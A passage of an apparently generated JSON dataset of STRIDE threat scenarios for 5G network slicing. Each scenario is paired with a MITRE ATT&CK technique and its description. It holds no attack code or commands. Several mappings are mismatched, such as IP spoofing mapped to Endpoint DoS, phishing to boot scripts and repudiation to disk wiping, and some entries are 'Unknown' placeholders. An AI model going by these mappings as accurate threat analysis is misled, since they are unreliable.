                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Targeted attacks on edge computing nodes disrupt critical low-latency applications.",
            "Assumptions": [
                {
                    "Assumption": "Edge nodes are susceptible to targeted attacks.",
                    "Role": "Network Administrator",
                    "Condition": "Inadequate security measures for edge nodes."
                },
                {
                    "Assumption": "Attackers focus on disrupting essential tasks at the edge.",
                    "Role": "Attacker",
                    "Condition": "Knowledge and focus on edge vulnerabilities."
                }
            ],
            "Potential Impact": "Critical low-latency applications experience interruptions, affecting real-time services.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "edge computing",
                "low-latency disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the network functions to gain elevated privileges and control over a network slice.",
            "Assumptions": [
                {
                    "Assumption": "There exists a vulnerability in the network functions.",
                    "Role": "Attacker",
                    "Condition": "Knowledge and exploitation of the vulnerability."
                },
                {
                    "Assumption": "Security measures do not adequately prevent privilege escalation.",
                    "Role": "Network Administrator",
                    "Condition": "Inadequate or missing privilege controls."
                }
            ],
            "Potential Impact": "Unauthorized control over network slices, potentially leading to data breaches and service manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "network functions",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious user leverages a compromised VNF to escalate privileges and access restricted segments.",
            "Assumptions": [
                {
                    "Assumption": "The VNF is vulnerable or has been compromised.",
                    "Role": "Attacker",
                    "Condition": "Compounding security flaws."
                },
                {
                    "Assumption": "Mechanisms to restrict access to critical segments are insufficient.",
                    "Role": "Network Administrator",
                    "Condition": "Weak or misconfigured segmentation policies."
                }
            ],
            "Potential Impact": "Access to restricted segments, facilitating further attacks and potential data exfiltration.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "VNF",
                "segmentation bypass"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker breaches the NFVO and gains administrative privileges, compromising the lifecycle management of network slices.",
            "Assumptions": [
                {
                    "Assumption": "The NFVO contains exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Discovery and exploitation of these vulnerabilities."
                },
                {
                    "Assumption": "Access controls to the NFVO are inadequately implemented.",
                    "Role": "Network Administrator",
                    "Condition": "Weak or absent access controls."
                }
            ],
            "Potential Impact": "Complete control over network slice management, allowing unauthorized modifications and potential disruptions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "NFVO",
                "administrative control"
            ],
            "mitre_technique": {
                "name": "Trusted Relationship",
                "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",
                "id": "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925",
                "technique_id": "T1199"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "27",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of a legitimate network function (NF) to gain unauthorized access to network slices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has sufficient knowledge to simulate a legitimate NF.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker has acquired detailed network information."
                },
                {
                    "Assumption": "Network functions do not have robust mutual authentication mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Valid if authentication mechanisms are weak or missing."
                },
                {
                    "Assumption": "There are no effective monitoring systems to detect identity spoofing activities.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if monitoring tools and protocols are insufficient."
                }
            ],
            "Potential Impact": "Compromised network functions and potential unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "identity-theft",
                "unauthorized-access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Users spoof their own IP addresses to gain unauthorized access to restricted network slices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has tools and skills to manipulate IP addresses.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has necessary technical skills."
                },
                {
                    "Assumption": "Network lacks effective IP-based access control mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Valid if there are weak or no IP filtering policies."
                },
                {
                    "Assumption": "There is no real-time monitoring of user activity on the network.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if activity logs are not frequently reviewed or monitored."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive slices and potential data leakage.",
            "MITRE ATT&CK Keywords": [
                "ip-address",
                "spoofing",
                "access-control",
                "unauthorized-access"
            ],
            "mitre_technique": {
                "name": "Endpoint Denial of Service",
                "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n",
                "id": "attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4",
                "technique_id": "T1499"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses phishing attacks to spoof legitimate user credentials for accessing the 5G management interfaces.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has successfully deployed phishing campaigns.",
                    "Role": "Attacker",
                    "Condition": "Valid if targets are susceptible to phishing techniques."
                },
                {
                    "Assumption": "Users may unknowingly provide their credentials due to lack of awareness.",
                    "Role": "User",
                    "Condition": "Valid if training and awareness are insufficient."
                },
                {
                    "Assumption": "Management interfaces do not use multi-factor authentication.",
                    "Role": "System Designer",
                    "Condition": "Valid if MFA is not implemented."
                }
            ],
            "Potential Impact": "Compromised user credentials leading to unauthorized administrative access.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "credentials",
                "spoofing",
                "management-interface"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker modifies VNFs to introduce malicious code.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has gained access to VNF management systems.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker bypasses network controls."
                },
                {
                    "Assumption": "VNFs are not regularly audited for integrity.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if insufficient integrity checks are performed."
                },
                {
                    "Assumption": "Security patches are infrequently applied.",
                    "Role": "System Designer",
                    "Condition": "Valid if patch management is poor."
                }
            ],
            "Potential Impact": "Introduction of backdoors or malicious functions into network slices.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "vulnerabilities",
                "malicious-code",
                "vnf"
            ],
            "mitre_technique": {
                "name": "Vulnerabilities",
                "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
                "id": "attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327",
                "technique_id": "T1588.006"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A malicious operator with administrative access tampers with orchestration policies.",
            "Assumptions": [
                {
                    "Assumption": "Malicious operator has administrative credentials.",
                    "Role": "Operator",
                    "Condition": "Valid if operator privileges are compromised."
                },
                {
                    "Assumption": "There are insufficient segregation of duties within administration roles.",
                    "Role": "System Designer",
                    "Condition": "Valid if administrative roles are mixed without oversight."
                },
                {
                    "Assumption": "Changes to orchestration policies are not logged or monitored.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if there is no logging/monitoring system in place."
                }
            ],
            "Potential Impact": "Improper allocation of resources, potential denial of service to legitimate users.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "orchestration",
                "administrative-access",
                "policies"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies data packets within a network slice, altering critical data in transit.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has access to network pathways and can intercept traffic.",
                    "Role": "Attacker",
                    "Condition": "Valid if network pathways are compromised."
                },
                {
                    "Assumption": "Data transmission is not encrypted or poorly encrypted.",
                    "Role": "System Designer",
                    "Condition": "Valid if encryption policies are weak."
                },
                {
                    "Assumption": "Network monitoring does not detect manipulation of data packets.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if intrusion detection systems are lacking."
                }
            ],
            "Potential Impact": "Integrity of transmitted data is compromised, leading to false data being accepted.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data-packets",
                "interception",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a command to a VNF, causing resource mismanagement.",
            "Assumptions": [
                {
                    "Assumption": "There are no strong audit trails or logs of user actions.",
                    "Role": "System Designer",
                    "Condition": "Valid if logging mechanisms are insufficient."
                },
                {
                    "Assumption": "System lacks a mechanism to verify command sources.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if source verification is absent."
                },
                {
                    "Assumption": "User authentication methods are not robust.",
                    "Role": "User",
                    "Condition": "Valid if there is weak user authentication."
                }
            ],
            "Potential Impact": "Resource misallocation and potential system performance issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logs",
                "command",
                "resources"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs unauthorized actions through an external interface and denies the operations.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces are not monitored for suspicious activity.",
                    "Role": "System Designer",
                    "Condition": "Valid if activity monitoring is weak."
                },
                {
                    "Assumption": "There is no mechanism to verify the authenticity of external requests.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if request verification is absent."
                },
                {
                    "Assumption": "Logs do not have tamper-evident features.",
                    "Role": "System Designer",
                    "Condition": "Valid if log integrity protections are missing."
                }
            ],
            "Potential Impact": "Unauthorized actions affect the network, with no way to attribute or validate the actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "external-interface",
                "unauthorized-actions",
                "logs"
            ],
            "mitre_technique": {
                "name": "HISTCONTROL",
                "description": "The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.",
                "id": "attack-pattern--086952c4-5b90-4185-b573-02bad8e11953",
                "technique_id": "T1148"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A privileged user denies changing critical network settings.",
            "Assumptions": [
                {
                    "Assumption": "There is no effective logging for administrative changes.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if changes are not logged."
                },
                {
                    "Assumption": "Authentication methods do not bind actions to specific users.",
                    "Role": "System Designer",
                    "Condition": "Valid if authentication mechanisms are weak."
                },
                {
                    "Assumption": "Role-based access control is not implemented.",
                    "Role": "System Designer",
                    "Condition": "Valid if RBAC is missing."
                }
            ],
            "Potential Impact": "Untraceable changes to network settings, affecting network performance and security.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "administrative-actions",
                "critical-settings",
                "unauthorized-changes"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data is intercepted and disclosed during transmission between VNFs.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without robust encryption.",
                    "Role": "System Designer",
                    "Condition": "Valid if strong encryption is not used."
                },
                {
                    "Assumption": "Attacker has access to network pathways.",
                    "Role": "Attacker",
                    "Condition": "Valid if network access is compromised."
                },
                {
                    "Assumption": "There is no monitoring to detect interception activities.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if network monitoring is weak."
                }
            ],
            "Potential Impact": "Confidential data is exposed leading to potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "information-disclosure",
                "data-transmission",
                "interception",
                "vulnerabilities"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits vulnerabilities in an external interface to access sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces have exploitable vulnerabilities.",
                    "Role": "System Designer",
                    "Condition": "Valid if vulnerabilities exist."
                },
                {
                    "Assumption": "Sensitive data is accessible through these interfaces without sufficient protection.",
                    "Role": "System Designer",
                    "Condition": "Valid if sensitive data is poorly protected."
                },
                {
                    "Assumption": "There are no intrusion detection mechanisms for the external interfaces.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if IDS is absent."
                }
            ],
            "Potential Impact": "Unauthorized access to and potential leakage of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "information-disclosure",
                "external-interface",
                "exploits",
                "sensitive-data"
            ],
            "mitre_technique": {
                "name": "Exploits",
                "description": "Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.(Citation: Exploit Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying)\n\nIn addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation: Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).(Citation: TempertonDarkHotel)\n\nAn adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",
                "id": "attack-pattern--f4b843c1-7e92-4701-8fed-ce82f8be2636",
                "technique_id": "T1588.005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A rogue network operator accesses and discloses user data from a specific network slice.",
            "Assumptions": [
                {
                    "Assumption": "The operator has privileged access to the network slice.",
                    "Role": "Operator",
                    "Condition": "Valid if access controls are inadequate."
                },
                {
                    "Assumption": "There is no mechanism to detect or prevent data access misuse.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if monitoring is insufficient."
                },
                {
                    "Assumption": "Sensitive user data is not encrypted at rest.",
                    "Role": "System Designer",
                    "Condition": "Valid if data encryption policies are weak."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of user data leading to privacy breaches.",
